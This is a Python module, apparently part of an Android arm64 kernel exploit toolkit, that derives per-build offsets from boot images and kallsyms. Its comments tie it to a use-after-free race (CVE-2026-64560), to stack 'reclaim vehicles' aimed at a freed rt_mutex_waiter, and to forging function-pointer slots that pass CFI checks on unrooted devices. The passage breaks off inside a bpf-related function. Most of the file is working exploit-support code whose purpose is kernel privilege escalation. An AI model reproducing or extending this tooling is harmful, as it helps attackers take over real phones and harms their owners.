#!/usr/bin/env python3
"""One implementation of every derivation rule in offset-maps.txt.

Two callers need the same answers from different inputs:

  offset_report.py        a rooted device's kallsyms/BTF/Image, diffed against
                          the committed target.h
  derive_offsets.py       a public boot.img alone, with no target.h to diff

If each carried its own copy of "SLIDE_LOGGERS_0_1_OFF is loggers + 8", the two
would drift and the offline path would quietly disagree with the live one on a
build nobody has rooted — the exact build where nothing would catch it. So the
rules live here and the table lives in offset-maps.txt; both callers read both.

Every resolver returns `(value, note)`. `value is None` means unresolved, and
`note` says why in the terms of the source that failed. No resolver guesses:
a rule that cannot prove its answer returns None rather than a plausible one.
"""
import bisect as _bisect
import os
import re
import struct

MAPS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "offset-maps.txt")

_SECTION = re.compile(r"^\[(\w+)\]$")


def load_maps(path=MAPS):
    """offset-maps.txt -> {section: "row\\nrow\\n..."} with comments stripped."""
    out, cur = {}, None
    with open(path) as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = _SECTION.match(line)
            if m:
                cur = m.group(1)
                out.setdefault(cur, [])
            elif cur:
                out[cur].append(line)
    return {k: "\n".join(v) for k, v in out.items()}


# ------------------------------------------------------------------ BTF ----

def btf_from_image(img, syms, kbase=None):
    """The kernel's own BTF, sliced out of the Image.

    CONFIG_DEBUG_INFO_BTF links the blob into the image between __start_BTF and
    __stop_BTF, and those are ordinary symbols. So the struct layouts a rooted
    device serves as /sys/kernel/btf/vmlinux are already in any boot.img: the
    slice taken here is byte-identical to the file a rooted device serves,
    since both are the same .BTF section of the same linked vmlinux. STRUCTMAP
    therefore needs no device either -- only SLABMAP still does, since a slab
    stride is a runtime fact and not in the image at all.

    Returns the blob, or None with a reason.
    """
    a, b = syms.get("__start_BTF"), syms.get("__stop_BTF")
    if a is None or b is None:
        return None, "__start_BTF/__stop_BTF absent — CONFIG_DEBUG_INFO_BTF off?"
    base = kbase if kbase is not None else syms.get("_text")
    if base is None:
        return None, "no _text to measure the BTF symbols against"
    lo, hi = a - base, b - base
    if not (0 <= lo < hi <= len(img)):
        return None, f"BTF span {lo:#x}..{hi:#x} outside a {len(img):#x}-byte Image"
    blob = img[lo:hi]
    if blob[:2] != b"\x9f\xeb":
        return None, f"no BTF magic at {lo:#x} — wrong base, or a stripped image"
    return blob, ""


# ------------------------------------------------------------ STRUCTMAP ----

def struct_field(entry, btf):
    """MACRO  struct.path[|struct.path...]  ->  field offset, or struct size.

    Alternatives exist for the same reason SYMMAP has them: a field can be
    renamed or re-nested across kernel versions. rt_mutex_waiter is the case
    that forced it -- 6.6 folded the rb_node, prio and deadline into an
    rt_waiter_node, so `tree_entry` became `tree.entry` and everything after
    it moved 0x20. A path with no dot names the struct itself and yields its
    size.
    """
    macro, paths = entry.split()
    last = ""
    for path in paths.split("|"):
        try:
            off, extra = btf.resolve(path)
        except ValueError as e:
            last = f"{path}: {e}"
            continue
        return (extra if off is None else off), ""
    return None, last or f"{macro}: no path resolved"


# --------------------------------------------------------------- SYMMAP ----

_SUFFIXED = {}


def _sym_lookup(syms, names):
    """Resolve the first of `names` that kallsyms carries, suffix and all.

    A local symbol the compiler had to disambiguate appears as `name$<hash>`,
    so an exact match misses it. Falling back to the unique `name$...` keeps a
    row written in source terms working against a build that renamed nothing
    but the symbol table. Ambiguous means unresolved: two hashes for one name
    are two different functions, and picking one is a guess.
    """
    for name in names.split("|"):
        if name in syms:
            return name, syms[name]
    for name in names.split("|"):
        key = name + "$"
        # `name$<hex>` and nothing further: the compiler's disambiguation is the
        # whole of the suffix, so this keeps aliases built on top of it (a
        # `.cfi_jt` thunk carries the same stem) out of the count.
        hits = [k for k in syms
                if k.startswith(key) and k[len(key):]
                and all(c in "0123456789abcdef" for c in k[len(key):])]
        if len(hits) == 1:
            return hits[0], syms[hits[0]]
    return None, None


def sym(entry, syms, text):
    """MACRO  symbol[|alt...]  addend  ->  image offset of symbol + addend."""
    _macro, names, addend = entry.split()
    _name, addr = _sym_lookup(syms, names)
    if addr is None:
        return None, f"{names.replace('|', ' / ')} absent — static or inlined"
    return addr - text + int(addend, 0), ""


# --------------------------------------------------------------- PTRMAP ----

def _u64(img, off):
    if off < 0 or off + 8 > len(img):
        return None
    return struct.unpack_from("<Q", img, off)[0]


def _amount(tok, known):
    """A rule field that is either a literal or the name of another macro."""
    try:
        return int(tok, 0), ""
    except ValueError:
        if tok in known:
            return known[tok], ""
        return None, f"{tok} unknown — it is a struct offset, so it comes from " \
                     f"BTF (harvest-live.sh) or a same-KMI header (--defines)"


def ptr(entry, img, known, kbase):
    """Chase a pointer in .data to reach a symbol no table exposes.

    MACRO deref   <base-macro> <byte-off>    the word at base+off, as an offset
    MACRO findptr <target-macro> <back-off>  the unique word pointing at target

    `known` supplies the base macro's value: the committed header when
    diffing, the freshly derived offsets when bootstrapping.

    Either offset may itself be a macro name rather than a literal. It has to
    be: the one deref in the table walks file_operations.compat_ioctl, which
    sits at 0x58 on android14-6.1 and 0x50 on android15-6.6, so a literal here
    silently reads the wrong slot on half the fleet.
    """
    _macro, rule, ref, arg = entry.split()
    arg, note = _amount(arg, known)
    if arg is None:
        return None, note
    base = known.get(ref)
    if base is None:
        return None, f"{ref} unknown — resolve it before this row"

    if rule == "deref":
        word = _u64(img, base + arg)
        if word is None:
            return None, f"{ref}+{arg:#x} out of range"
        if word < kbase or word - kbase >= len(img):
            return None, f"{ref}+{arg:#x} is {word:#x} — not a text pointer"
        return word - kbase, ""

    if rule == "findptr":
        want = kbase + base
        hits = [i for i in range(0, len(img) - 8, 8)
                if struct.unpack_from("<Q", img, i)[0] == want]
        if len(hits) != 1:
            return None, f"{len(hits)} words point at {ref}, need exactly 1"
        return hits[0] - arg, ""

    return None, f"unknown rule {rule}"


# --------------------------------------------------------------- CODEMAP ---

BRK_WARN = 0xD4210000            # brk #0x800 -- arm64 WARN_ON/BUG trap
_SPAN_CAP = 0x800                # how far into a function either rule looks


def _u32(img, off):
    if off < 0 or off + 4 > len(img):
        return 0
    return struct.unpack_from("<I", img, off)[0]


def _cbz_target(w):
    """CBZ Xt, label -> (Rt, signed byte displacement), or None."""
    if (w & 0xFF000000) != 0xB4000000:      # sf=1, CBZ (64-bit)
        return None
    imm = (w >> 5) & 0x7FFFF
    if imm & (1 << 18):
        imm -= 1 << 19
    return w & 0x1F, imm * 4


def _adrp_page(w, pc):
    """ADRP Xd, page -> (Rd, page address), or None."""
    if (w & 0x9F000000) != 0x90000000:
        return None
    imm = (((w >> 5) & 0x7FFFF) << 2) | ((w >> 29) & 3)
    if imm & (1 << 20):
        imm -= 1 << 21
    return w & 0x1F, (pc & ~0xFFF) + (imm << 12)


def _add_imm(w):
    """ADD Xd, Xn, #imm (LSL 0) -> (Rd, Rn, imm), or None."""
    if (w & 0xFF800000) != 0x91000000:
        return None
    return w & 0x1F, (w >> 5) & 0x1F, (w >> 10) & 0xFFF


# --------------------------------------------------------------- CFI JT ----

_B_MASK, _B_OP = 0xFC000000, 0x14000000


def _b_target(w, pc):
    """Target of an unconditional `b`, or None."""
    if (w & _B_MASK) != _B_OP:
        return None
    imm = w & 0x03FFFFFF
    if imm & 0x02000000:
        imm -= 0x04000000
    return pc + imm * 4


def jump_table(entry, img, syms, text, known=None):
    """The CFI jump-table thunk for a function, or the function itself.

    MACRO <symbol|alt-symbol...>       the function named by a symbol
    MACRO at-offset <MACRO>            the function another macro's value locates,
                                       for one kallsyms does not expose

    A kernel built with CFI jump tables does not store function bodies in
    function-pointer tables. It stores a four-byte thunk -- a lone `b
    <function>` in a jump-table region -- and an indirect call is checked
    against the thunk, so a forged table carrying the body aborts the first
    time anything calls through it. What a forged slot has to hold is
    therefore whatever the genuine table holds, and that is what this
    resolves.

    The thunk is found by its own definition: the unique `b <symbol>` in the
    image that is not inside a function (a tail call into `symbol` from
    ordinary code is a `b` too, so candidates landing inside a known symbol's
    body are discarded). Unique or unresolved -- two survivors mean the
    discriminator no longer identifies the table on this build, and a guess
    there is a slot that faults.

    A build without jump tables has no such thunk, and the answer is the
    function's own offset: that is what its genuine tables hold.
    """
    fields = entry.split()
    if fields[1] == "at-offset":
        base = fields[2]
        if not known or known.get(base) is None:
            return None, f"{base} unresolved, so its thunk cannot be found"
        name = base
        target = text + int(known[base])
    else:
        name, target = _sym_lookup(syms, fields[1])
        if target is None:
            return None, f"{fields[1]} absent from kallsyms"

    # Sorted symbol starts, so a candidate can be tested for "inside a function".
    starts = sorted(syms.values())

    found = []
    for off in range(0, len(img) - 3, 4):
        pc = text + off
        if _b_target(_u32(img, off), pc) != target:
            continue
        i = _bisect.bisect_right(starts, pc) - 1
        # A thunk is its own symbol-less island: the `b` is the whole of it, so
        # the instruction before it belongs to another thunk or to padding,
        # never to a function that falls through into this one.
        prev = _u32(img, off - 4) if off >= 4 else 0
        if i >= 0 and starts[i] == pc:
            found.append(pc)            # the thunk carries a symbol of its own
        elif _b_target(prev, pc - 4) is not None or prev == 0:
            found.append(pc)
    if not found:
        return target - text, f"no jump-table thunk; {name} itself"
    if len(found) > 1:
        return None, (f"{len(found)} candidate thunks for {name} "
                      f"({', '.join(hex(a) for a in found[:4])})")
    return found[0] - text, f"jump-table thunk for {name}"


def code(entry, img, syms, text):
    """Offsets only the instruction stream carries.

    MACRO cbz-to-warn <symbol> <span>  -> offset WITHIN symbol
    MACRO self-addr   <symbol> 0       -> offset within the IMAGE

    Both anchor on something the compiler cannot move without changing the
    meaning, and both demand a unique match, so a build that reshapes the
    function yields UNRESOLVED instead of a wrong offset.
    """
    _macro, rule, name, arg = entry.split()
    arg = int(arg, 0)
    if name not in syms:
        return None, f"{name} absent from kallsyms"
    start = syms[name] - text
    limit = min(_SPAN_CAP, len(img) - start)

    if rule == "cbz-to-warn":
        # The arm taken when an inlined helper returned NULL and the kernel
        # complains. Anchoring on the WARN rather than counting `bl`s survives
        # a helper being inlined or not, and it self-validates: no brk, no
        # answer. This locates the CVE-2026-64560 race branch without
        # hand-disassembly.
        found = []
        for i in range(0, limit, 4):
            cbz = _cbz_target(_u32(img, start + i))
            if not cbz or cbz[0] != 0:        # cbz x0 -- the NULL-return test
                continue
            tgt = i + cbz[1]
            if not 0 <= tgt < limit:
                continue
            if any(_u32(img, start + tgt + k * 4) == BRK_WARN for k in range(arg)):
                found.append(tgt)
        if len(found) != 1:
            return None, (f"{len(found)} `cbz x0` arms reach a brk in {name}, "
                          f"need exactly 1")
        return found[0], ""

    if rule == "self-addr":
        # _THIS_IP_ is the address of a label inside the function, which the
        # compiler materialises as adrp+add. Exactly one such pair computes an
        # address that lands back inside the function it sits in, so "points at
        # itself" identifies it without knowing the instruction schedule.
        span = _func_span(syms, name, limit)
        regs, found = {}, []
        for i in range(0, span, 4):
            w = _u32(img, start + i)
            adrp = _adrp_page(w, start + i)
            if adrp:
                regs[adrp[0]] = adrp[1]
                continue
            add = _add_imm(w)
            if add and add[1] in regs:
                val = regs[add[1]] + add[2]
                if start <= val < start + span:
                    found.append(val)
        if len(found) != 1:
            return None, (f"{len(found)} adrp/add pairs in {name} point into "
                          f"{name}, need exactly 1")
        return found[0], ""

    return None, f"unknown rule {rule}"


# -------------------------------------------------------------- STACKMAP ---
#
# Constants that are neither a symbol offset nor a struct field, but a relation
# between two kernel stack frames. One rule so far: where the freed
# rt_mutex_waiter lands inside core_sys_select()'s stack_fds, which is what the
# pselect reclaim vehicle has to aim at (PSELECT_WAITER_WORD_SHIFT).
#
# It is a per-BUILD fact, not a per-version one: the landing word is set by the
# compiler's frame layout and by whether do_futex survived inlining, so two
# builds of the same kernel version can differ, and one of them can be
# unusable. That is exactly why it has to be derived per target rather than
# inherited from a sibling flavour.

# The two paths, from the syscall wrapper down to the frame that matters. Both
# are entered from invoke_syscall's single `blr x8` (one call site for every
# syscall, its own frame fixed), so the wrappers start at the same SP and the
# common part cancels when the two are subtracted.
_FUTEX_CHAIN = ("__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi")
_SELECT_CHAIN = ("__arm64_sys_pselect6", "core_sys_select")
# waiter is the 3rd argument of rt_mutex_wait_proxy_lock(lock, to, waiter) and
# the 2nd of rt_mutex_cleanup_proxy_lock(lock, waiter). _witness_slot() tries
# them in this order and the first that yields exactly one candidate slot
# answers; more than one candidate from a single witness refuses.
_WAITER_WITNESSES = (("rt_mutex_wait_proxy_lock", 2),
                     ("rt_mutex_cleanup_proxy_lock", 1))
# Witnesses for the stack_fds pointer, tried in order. get_fd_set() carries it
# as an argument where the compiler kept the helper out of line; where the
# helper was inlined the same pointer is the destination of the user copy that
# helper performs, so the copy routine witnesses it just as well. Both are
# identified the same way -- the one sp-relative register live at every call --
# so a build that inlines one of them is read rather than refused.
_FDS_WITNESSES = (("get_fd_set", 2), ("__arch_copy_from_user", 0),
                  ("_copy_from_user", 0))

# The sigreturn reclaim vehicle's own chain: rt_sigreturn(2) down to the
# stack-local struct user_fpsimd_state __arch_copy_from_user() fills from
# the signal frame's fpsimd_context record, later consumed BY VALUE by
# fpsimd_update_current_state() into task_struct (a dead end for reclaim --
# only the stack-resident copy on the way there is live). Two shapes exist:
# on android14-6.1/android15-6.6, restore_sigframe/parse_user_sigframe/
# restore_fpsimd_context are all inlined into __arm64_sys_rt_sigreturn
# (absent from kallsyms as standalone symbols), so the "chain" here is the
# syscall wrapper itself; on qgki-5.4, restore_fpsimd_context survives as
# its own real function, handled instead by _SIGRETURN_SEPARATE_CHAIN
# (below _sigreturn_fpsimd_slot()) -- see _sigreturn_delta()'s docstring for
# how the two are picked between.
_SIGRETURN_CHAIN = ("__arm64_sys_rt_sigreturn",)
# __arm64_sys_rt_sigreturn calls __arch_copy_from_user FOUR times (general
# registers, a header scan, the fpsimd record, and -- only on an SVE-capable
# build parsing an SVE record -- the SVE payload), so _witness_slot()'s
# single-candidate model cannot disambiguate them; two of the four (the
# fpsimd record and the SVE one) even land at the SAME sp-relative slot on
# every kernel checked, since the compiler reuses one local buffer for both.
# _sigreturn_fpsimd_slot() (below) disambiguates by SEQUENCE instead of by
# register uniqueness: the call immediately followed (before any other
# __arch_copy_from_user) by a call to fpsimd_update_current_state is the one
# whose destination is live in task_struct afterwards -- the other three are
# either GPRs (never consumed by fpsimd_update_current_state) or the SVE
# path (Report A/B of the sigreturn-vehicle research: bypasses the stack
# entirely into a separately kzalloc'd thread.sve_state, not this vehicle's
# target).
_SIGRETURN_COPY_CALLEE = "__arch_copy_from_user"
_SIGRETURN_CONSUMER_CALLEE = "fpsimd_update_current_state"
# __arm64_sys_rt_sigreturn, on a build where every helper above is inlined
# into it, is a single giant function whose body runs well past _SPAN_CAP,
# hence the wider cap below. Reused as the span cap for _SIGRETURN_SEPARATE_CHAIN's
# own last hop too (restore_fpsimd_context), which is comfortably smaller.
_SIGRETURN_SPAN_CAP = 0x2000
# How far past a __arch_copy_from_user call fpsimd_update_current_state may
# still be and count as consuming THAT copy, not some later, unrelated one.
_SIGRETURN_CONSUMER_LOOKAHEAD = 0x400

_FRAME_SCAN = 0x40           # bytes of prologue to read for the frame size


def _sub_sp_imm(w):
    """SUB sp, sp, #imm (LSL 0) -> imm, or None."""
    if (w & 0xFF8003FF) != 0xD10003FF:      # sf=1, Rd=sp, Rn=sp
        return None
    return (w >> 10) & 0xFFF


def _stp_pre_sp(w):
    """STP Xt, Xt2, [sp, #-imm]! -> imm (the frame it opens), or None."""
    if (w & 0xFFC003E0) != 0xA98003E0:      # 64-bit STP pre-index, Rn=sp
        return None
    imm = (w >> 15) & 0x7F
    if imm & 0x40:
        imm -= 0x80
    return -imm * 8 if imm < 0 else None


def _mov_reg(w):
    """MOV Xd, Xn (ORR Xd, XZR, Xn) -> (Rd, Rn), or None.

    A stack address is materialised once with `add Xn, sp, #imm` and then moved
    into the argument register at each call site, so tracking the copy is what
    makes an argument-position read possible at all.
    """
    if (w & 0xFFE0FFFF) != 0xAA0003E0:
        return None
    return w & 0x1F, (w >> 16) & 0x1F


def _bl_target(w, pc):
    """BL label -> absolute target, or None."""
    if (w & 0xFC000000) != 0x94000000:
        return None
    imm = w & 0x03FFFFFF
    if imm & (1 << 25):
        imm -= 1 << 26
    return pc + imm * 4


_FRAME_CACHE = {}               # (id(img), name) -> frame, for the graph walk


def _frame_of(img, syms, name, text):
    """Static bytes the prologue subtracts from sp.

    Every frame in both chains is one static adjustment; a build that allocated
    dynamically (alloca, a VLA) would not be readable this way, and returning
    None here is the honest answer rather than a plausible number.
    """
    ck = (id(img), name)
    if ck in _FRAME_CACHE:
        return _FRAME_CACHE[ck]
    start = syms[name] - text
    total = 0
    for i in range(0, _FRAME_SCAN, 4):
        w = _u32(img, start + i)
        v = _sub_sp_imm(w)
        if v is None:
            v = _stp_pre_sp(w)
        if v is not None:
            total += v
        if _bl_target(w, 0) is not None:
            break
    _FRAME_CACHE[ck] = total or None
    return _FRAME_CACHE[ck]


# Opt-in: a name -> {addr, ...} multimap for builds where the same local
# symbol name genuinely repeats at many addresses -- a small helper defined
# `static` in a widely-included header gets its own clone per translation
# unit, once per .o that includes it, all with internal ('t') linkage and the
# identical bare name (observed on a QGKI 5.4 build: hundreds of
# `_copy_from_user` clones, one per TU). `syms` itself cannot represent this
# (one address per name, by construction -- every other reader in this file
# relies on that), so this is a second, explicitly multi-valued index, filled
# by load_duplicate_addrs() / load_duplicate_addrs_from_text() below. Both
# derivation front ends (derive_offsets.py, offset_report.py) call one of
# those unconditionally.
_DUPLICATE_ADDRS = {}


def _parse_duplicate_addrs(lines):
    multi = {}
    for line in lines:
        parts = line.split()
        if len(parts) < 3:
            continue
        if len(parts) > 3 and parts[3].startswith("["):
            continue            # module symbols carry a trailing [module]
        try:
            addr = int(parts[0], 16)
        except ValueError:
            continue
        if parts[1] in ("t", "T") and addr != 0:
            multi.setdefault(parts[2], set()).add(addr)
    return multi


def load_duplicate_addrs(kallsyms_path):
    """Populate the multimap _callee_addrs() consults for a name with more
    than one real address, from a raw kallsyms file (the same file a normal
    `syms` load reads with setdefault() and one address per name wins).
    Overwrites any previous call's data. Returns the multimap, so a caller
    can also inspect it directly."""
    global _DUPLICATE_ADDRS
    with open(kallsyms_path, errors="replace") as f:
        multi = _parse_duplicate_addrs(f)
    _DUPLICATE_ADDRS = multi
    return multi


def load_duplicate_addrs_from_text(kallsyms_text):
    """Same as load_duplicate_addrs(), from a kallsyms dump already in
    memory (kallsyms-finder's stdout, when derive_offsets.py recovers a
    symbol table straight from an Image and never writes it to disk)
    instead of a path on disk."""
    global _DUPLICATE_ADDRS
    multi = _parse_duplicate_addrs(kallsyms_text.splitlines())
    _DUPLICATE_ADDRS = multi
    return multi


def _callee_addrs(syms, callee):
    """Every address a call to <callee> can land on.

    LTO and ICF rename a local into `name.NNNNN`, and a link-time clone is the
    symbol the call site actually targets, so matching the bare name alone
    misses the call entirely. Accepting the suffixed forms reads such a build
    instead of reporting it unresolvable.

    Also unions in every address load_duplicate_addrs() recorded under this
    exact name, for a build where the same local symbol name repeats at many
    real addresses (see its docstring) -- syms itself only ever holds one.
    """
    found = {a for n, a in syms.items()
             if n == callee or n.startswith(callee + ".")}
    found |= _DUPLICATE_ADDRS.get(callee, set())
    return found


def _sp_slots_at_calls(img, syms, text, fn, callee, span):
    """For each `bl <callee>` in <fn>, the sp-relative registers live there.

    Returns a list of {reg: sp offset} snapshots, one per call site.
    """
    start = syms[fn] - text
    want = _callee_addrs(syms, callee)
    snaps, regs = [], {}
    for i in range(0, span, 4):
        w = _u32(img, start + i)
        add = _add_imm(w)
        if add and add[1] == 31:            # add Xd, sp, #imm
            regs[add[0]] = add[2]
            continue
        if add:                             # add Xd, Xn, #imm
            # A buffer inside a larger stack object is reached as base+offset,
            # so a displacement from a register that already holds a stack
            # address is still a stack address.
            if add[1] in regs:
                regs[add[0]] = regs[add[1]] + add[2]
            else:
                regs.pop(add[0], None)
            continue
        mov = _mov_reg(w)
        if mov:
            if mov[1] in regs:
                regs[mov[0]] = regs[mov[1]]
            else:
                regs.pop(mov[0], None)
            continue
        tgt = _bl_target(w, syms[fn] + i)
        if tgt is not None and tgt in want:
            snaps.append(dict(regs))
    return snaps


def _chain_validated(img, syms, text, chain):
    """Every hop in `chain` must be a real, uninlined call -- a link that was
    inlined away (PGO does this to do_futex on some vendor builds, or to
    do_pselect / an equivalent single-line wrapper on others) changes the
    frame sum, and an offset computed from the declared chain would be wrong.
    Returns None on success, an error string otherwise -- the honest answer
    ('unresolved') rather than a plausible wrong number."""
    for caller, callee in zip(chain, chain[1:]):
        if caller not in syms or callee not in syms:
            return f"{caller} or {callee} absent from kallsyms"
        span = _func_span(syms, caller, _SPAN_CAP)
        if not _sp_slots_at_calls(img, syms, text, caller, callee, span) \
           and not any(_bl_target(_u32(img, syms[caller] - text + i),
                                  syms[caller] + i) == syms[callee]
                       for i in range(0, span, 4)):
            return (f"{caller} does not call {callee} -- the chain is "
                    f"inlined here, so the frame sum does not apply")
    return None


def _witness_slot(img, syms, text, caller, span, witnesses):
    """Search `witnesses` (a list of (callee_name, argreg) pairs, tried in
    order) for the one sp-relative slot a value is kept at across every call
    `caller` makes to a candidate callee. Falls back to the single register
    live at every call site (excluding x29, the frame pointer, which
    qualifies everywhere and would always be a second candidate) when the
    argument was not materialised in a form the direct read follows -- the
    same fallback the pselect stack_fds witness uses.

    Returns (slot, witness_name) or (None, error_string).
    """
    for cand, argreg in witnesses:
        if not _callee_addrs(syms, cand):
            continue
        snaps = _sp_slots_at_calls(img, syms, text, caller, cand, span)
        seen = {snap[argreg] for snap in snaps if argreg in snap}
        if not seen and snaps:
            common = None
            for snap in snaps:
                here = {(r, o) for r, o in snap.items() if r != 29}
                common = here if common is None else (common & here)
            if common and len(common) == 1:
                seen = {common.pop()[1]}
        if not seen:
            continue
        if len(seen) != 1:
            return None, (f"{len(seen)} candidate slots from {cand} in "
                          f"{caller}, need exactly 1")
        return seen.pop(), cand
    return None, ("no witness in %s; tried %s"
                  % (caller, ", ".join(c for c, _ in witnesses)))


def _add_sp_imm_giveback(w):
    """ADD sp, sp, #imm (LSL 0) -> imm, or None -- the inverse of
    _sub_sp_imm(): a mid-function stack GIVEBACK, not a prologue open."""
    if (w & 0xFF8003FF) != 0x910003FF:      # sf=1, Rd=sp, Rn=sp
        return None
    return (w >> 10) & 0xFFF


def _scan_sp_regs(img, syms, text, fn, span):
    """Walk <fn>'s instructions, tracking which registers hold a stack
    address and the running sp DEPTH from function entry (every prologue
    open, every mid-function `sub sp,sp,#imm`, every `add sp,sp,#imm`
    giveback), not just the prologue _frame_of() reads.

    A function's stack use need not be monotonic: a `sub sp,sp,#imm` opened
    for one phase is given back before a later call site, so an
    `add xN,sp,#imm` there is relative to a shallower sp than the prologue
    figure. regs[] therefore holds a SIGNED offset from ENTRY sp (address =
    entry sp + regs[reg]), the same sign convention chain_slot_delta()'s
    abs_a/abs_b use -- current sp is entry_sp-depth, so
    regs[Xd] = -depth + imm = imm - depth.

    Yields (byte_offset_into_fn, instruction_word, regs, depth) per
    instruction, regs already updated for that instruction. regs is the live
    dict, so a consumer that keeps a snapshot must copy it.
    """
    start = syms[fn] - text
    regs, depth = {}, 0
    for i in range(0, span, 4):
        w = _u32(img, start + i)
        v = _stp_pre_sp(w)
        if v is None:
            v = _sub_sp_imm(w)
        if v is not None:
            depth += v
            yield i, w, regs, depth
            continue
        v = _add_sp_imm_giveback(w)
        if v is not None:
            depth -= v
            yield i, w, regs, depth
            continue
        add = _add_imm(w)
        if add and add[1] == 31:        # add Xd, sp, #imm
            regs[add[0]] = add[2] - depth
        elif add:                       # add Xd, Xn, #imm
            if add[1] in regs:
                regs[add[0]] = regs[add[1]] + add[2]
            else:
                regs.pop(add[0], None)
        else:
            mov = _mov_reg(w)
            if mov:
                if mov[1] in regs:
                    regs[mov[0]] = regs[mov[1]]
                else:
                    regs.pop(mov[0], None)
        yield i, w, regs, depth


def _sigreturn_fpsimd_slot(img, syms, text, fn, copy_callee, consumer_callee,
                           span, lookahead):
    """Disambiguates __arm64_sys_rt_sigreturn's several __arch_copy_from_user
    calls by SEQUENCE rather than by register uniqueness (_witness_slot()'s
    model): the call immediately followed, within `lookahead` bytes and
    before any other call to `copy_callee`, by a call to `consumer_callee`
    is the one whose destination fpsimd_update_current_state() actually
    reads -- see _SIGRETURN_COPY_CALLEE's comment above for why the other
    calls (general registers, an SVE record) are not candidates.

    On the inlined shape (every helper folded into
    __arm64_sys_rt_sigreturn) this function's own stack use is not
    monotonic: a `sub sp,sp,#0x250` opened for the general-purpose-register
    restore path is given back with a matching `add sp,sp,#0x250` before the
    fpsimd copy is reached, so the copy's own `add xN,sp,#imm` is relative
    to a shallower sp than the function's peak. The scan therefore goes
    through _scan_sp_regs() and the result is a signed offset from this
    function's own entry sp (address = entry sp + value), the sign
    convention chain_slot_delta()'s abs_a/abs_b use -- do not combine it
    with a separate _frame_of(fn) call.

    Returns (sp_offset_from_entry, None) or (None, error_string).
    """
    want_copy = _callee_addrs(syms, copy_callee)
    want_consumer = _callee_addrs(syms, consumer_callee)
    candidate = None                    # (offset_of_call, sp_offset_from_entry)
    for i, w, regs, _depth in _scan_sp_regs(img, syms, text, fn, span):
        tgt = _bl_target(w, syms[fn] + i)
        if tgt is None:
            continue
        if tgt in want_copy:
            candidate = (i, regs.get(0))
            continue
        if tgt in want_consumer and candidate is not None \
           and i - candidate[0] <= lookahead:
            if candidate[1] is None:
                return None, (f"{copy_callee}'s arg0 is not sp-relative at "
                              f"the call {consumer_callee} consumes")
            return candidate[1], None
    return None, (f"no {copy_callee} call within {lookahead} bytes before "
                  f"{consumer_callee} in {fn}")


# The clone3 reclaim vehicle's own chain: __arm64_sys_clone3(2) down to the
# stack-local struct clone_args copy_clone_args_from_user() fills via
# copy_struct_from_user() (an __always_inline wrapper around copy_from_user(),
# include/linux/uaccess.h), which is where the flat, fixed-size buffer this
# vehicle targets actually lives.
_CLONE3_CHAIN = ("__arm64_sys_clone3", "copy_clone_args_from_user")
# copy_from_user()'s own inline chain bottoms out at __arch_copy_from_user().
# On android14-6.1, every layer between copy_clone_args_from_user and
# __arch_copy_from_user is inlined away, so the `bl` in the function body
# targets __arch_copy_from_user directly. On android15-6.6 and qgki-5.4, it
# is not: _copy_from_user (include/linux/uaccess.h, `static inline` under
# INLINE_COPY_FROM_USER) is left as its own out-of-line function instead, and
# because it is `static`, every translation unit that calls copy_from_user()
# and does not fully inline it gets its OWN clone, with internal ('t')
# linkage and the identical bare name "_copy_from_user" -- many such clones,
# one per calling translation unit, on a build shaped this way. `syms` holds
# one address per name, so without load_duplicate_addrs()/
# load_duplicate_addrs_from_text() populating _DUPLICATE_ADDRS from the raw
# kallsyms first, the one clone fork.c's TU actually calls is not necessarily
# the address `syms` happens to have kept: the `bl` at
# copy_clone_args_from_user's copy site can land on a `t _copy_from_user`
# kallsyms line at a different address from the one
# `syms["_copy_from_user"]` holds.
#
# Two shapes of the same fact, not two different derivations: one
# chain_slot_delta() call below covers both, with no shape-specific
# branching the way _sigreturn_delta() needs -- the witness list just names
# both candidate callees.
_CLONE3_WITNESSES = (("__arch_copy_from_user", 0), ("_copy_from_user", 0))

# The process_vm_readv/process_vm_writev reclaim vehicle's own chain:
# process_vm_rw()'s own two side-by-side stack-local struct iovec[UIO_FASTIOV]
# fast arrays -- one for the "local" vector, one for the "remote" one -- and
# this targets the remote one specifically (the call process_vm_rw() makes
# second, after the local one). Both kernel shapes take the fast array's
# address as a DIRECT argument (no out-param indirection the way do_readv's
# import_iovec call needs), just through a different helper and argument
# position depending on kernel age: android14-6.1's own process_vm_rw()
# calls iovec_from_user(uvector, nr_segs, fast_segs, fast_iov, compat) --
# fast_iov is arg index 3 -- while qgki-5.4's calls the older
# rw_copy_check_uvector(type, uvector, nr_segs, fast_segs, fast_pointer,
# ret_pointer) -- fast_pointer is arg index 4. Read from each build's own
# disassembly rather than assumed from its nominal GKI source, since a live
# kernel's instruction selection can diverge from what its checked-out
# source tree shows. One chain_slot_delta() call covers both shapes, same
# pattern as _CLONE3_WITNESSES above.
_PROCESS_VM_CHAIN = ("__arm64_sys_process_vm_readv", "process_vm_rw")
_PROCESS_VM_WITNESSES = (("iovec_from_user", 3), ("rw_copy_check_uvector", 4))

# restore_sigframe's own fpsimd hop, when it is a real, uninlined function
# (e.g. qgki-5.4) rather than folded into __arm64_sys_rt_sigreturn (every
# android14-6.1/android15-6.6 build checked). Two shapes of the same fact,
# not two different facts -- see _sigreturn_delta()'s docstring.
_SIGRETURN_SEPARATE_CHAIN = ("__arm64_sys_rt_sigreturn", "restore_sigframe",
                            "restore_fpsimd_context")
_SIGRETURN_SEPARATE_WITNESSES = ((_SIGRETURN_COPY_CALLEE, 0),)

# The bpf(2) reclaim vehicle's own chain: __sys_bpf()/__do_sys_bpf()'s own
# stack-local `union bpf_attr attr` -- every bpf command shares this one
# front-door copy before dispatching on cmd, so which command is passed
# afterwards does not matter to the derivation. Two shapes, picked by which
# symbol survives as its own function (_bpf_delta() below), the same pattern
# _sigreturn_delta() uses: android14-6.1/android15-6.6 keep the inline
# helper's name, __sys_bpf; qgki-5.4's older compiler keeps the
# SYSCALL_DEFINE-generated name instead, __do_sys_bpf, with __sys_bpf itself
# absent from kallsyms. Both call the copy through copy_from_bpfptr() on
# android14-6.1/android15-6.6; qgki-5.4 predates that abstraction and calls a
# per-TU "_copy_from_user" clone directly instead, the same
# _CLONE3_WITNESSES situation. Read from each build's own disassembly rather
# than assumed from source.
_BPF_CHAIN_NEW = ("__arm64_sys_bpf", "__sys_bpf")
_BPF_CHAIN_OLD = ("__arm64_sys_bpf", "__do_sys_bpf")
_BPF_WITNESSES = (("copy_from_bpfptr", 0), ("_copy_from_user", 0))


def _bpf_delta(img, syms, text):
